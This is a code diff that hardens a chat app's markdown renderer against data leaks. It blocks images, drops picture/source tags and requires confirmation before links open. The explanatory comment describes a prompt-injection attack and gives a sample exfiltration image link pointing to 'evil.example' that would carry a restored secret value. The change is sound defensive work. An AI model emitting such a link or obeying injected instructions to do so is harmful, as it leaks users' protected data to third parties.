@@ -1,7 +1,7 @@
 import type { ProtectionPreviewOrigin } from "@serovaai/ficta-protocol";
 import { mermaid } from "@streamdown/mermaid";
 import { memo, type ReactNode, useMemo } from "react";
-import { Streamdown } from "streamdown";
+import { defaultRehypePlugins, Streamdown, type StreamdownProps } from "streamdown";
 import { lastDocumentBlock, lastHeading } from "@/lib/documents/document-blocks";
 import {
   type ProtectionHighlightAnnotation,
@@ -21,6 +21,60 @@ const RESTORE_ALLOWED_TAGS = Object.fromEntries(RESTORE_TAGS.map((tag) => [tag, 
 const RESTORE_LITERAL_TAGS = RESTORE_TAGS;
 // Module-level so the memoized component's props stay referentially stable across renders.
 const STREAMDOWN_PLUGINS = { mermaid };
+
+type RehypePlugins = NonNullable<StreamdownProps["rehypePlugins"]>;
+type RehypePlugin = Extract<RehypePlugins[number], (...args: never[]) => unknown>;
+type SanitizeSchema = { tagNames?: string[]; attributes?: Record<string, unknown[]> };
+
+/**
+ * Assistant text is model output, and the model reads attacker-controllable documents, so a prompt
+ * injection can ask for `![x](https://evil.example/?c=FICTA_…)`. The proxy restores the real value
+ * inside that URL, so a rendered remote image would send it to a third party with no click.
+ * Streamdown's defaults allow every image and link prefix, so the chat replaces them:
+ *
+ * - no images: `allowedImagePrefixes: []` and `allowDataImages: false` block every `img` (the sanitize
+ *   schema already drops `data:` sources); harden swaps it for an inline "image blocked" indicator;
+ * - `picture`/`source` are dropped from the sanitize schema, because `source srcset` fetches on
+ *   render and harden only rewrites `img src` and `a href`;
+ * - links keep any http(s)/mailto target but no custom protocols, and stay behind Streamdown's
+ *   link-safety confirmation (it shows the full URL before opening it).
+ *
+ * Passing `rehypePlugins` also turns off Streamdown's own `allowedTags` schema merge, so the restore
+ * highlight tags are added to the sanitize schema here.
+ */
+// Reuse Streamdown's own raw/sanitize/harden plugins (no extra dependency); fail at load, never render
+// unhardened, if a Streamdown upgrade renames or reshapes them.
+const { raw: rehypeRaw, sanitize: sanitizeEntry, harden: hardenEntry } = defaultRehypePlugins;
+if (!rehypeRaw || !Array.isArray(sanitizeEntry) || !Array.isArray(hardenEntry)) {
+  throw new Error("streamdown defaultRehypePlugins changed shape; update the chat markdown hardening");
+}
+const RAW_PLUGIN: RehypePlugins[number] = rehypeRaw;
+const [rehypeSanitize, DEFAULT_SANITIZE_SCHEMA] = sanitizeEntry as unknown as [RehypePlugin, SanitizeSchema];
+const [rehypeHarden] = hardenEntry as unknown as [RehypePlugin, unknown];
+const RENDER_FETCHING_TAGS = new Set(["picture", "source"]);
+const HARDEN_OPTIONS = {
+  allowedImagePrefixes: [],
+  allowDataImages: false,
+  allowedLinkPrefixes: ["*"],
+  allowedProtocols: [],
+};
+
+function chatRehypePlugins(extraTags: Record<string, string[]>): RehypePlugins {
+  const { picture: _picture, source: _source, ...attributes } = DEFAULT_SANITIZE_SCHEMA.attributes ?? {};
+  const schema = {
+    ...DEFAULT_SANITIZE_SCHEMA,
+    tagNames: [
+      ...(DEFAULT_SANITIZE_SCHEMA.tagNames ?? []).filter((tag) => !RENDER_FETCHING_TAGS.has(tag)),
+      ...Object.keys(extraTags),
+    ],
+    attributes: { ...attributes, ...extraTags },
+  };
+  return [RAW_PLUGIN, [rehypeSanitize, schema], [rehypeHarden, HARDEN_OPTIONS]];
+}
+
+const REHYPE_PLUGINS = chatRehypePlugins({});
+const RESTORE_REHYPE_PLUGINS = chatRehypePlugins(RESTORE_ALLOWED_TAGS);
+const LINK_SAFETY = { enabled: true };
 
 /**
  * The markdown seam, now in two layers. `Markdown` (exported) splits the text around the last
@@ -111,8 +165,10 @@ const MarkdownSegment = memo(function MarkdownSegment({
       allowedTags={highlighted ? RESTORE_ALLOWED_TAGS : undefined}
       className="max-w-none space-y-3 text-[0.95rem] leading-relaxed"
       components={highlighted ? restoreComponents : undefined}
+      linkSafety={LINK_SAFETY}
       literalTagContent={highlighted ? RESTORE_LITERAL_TAGS : undefined}
       plugins={STREAMDOWN_PLUGINS}
+      rehypePlugins={highlighted ? RESTORE_REHYPE_PLUGINS : REHYPE_PLUGINS}
     >
       {html}
     </Streamdown>
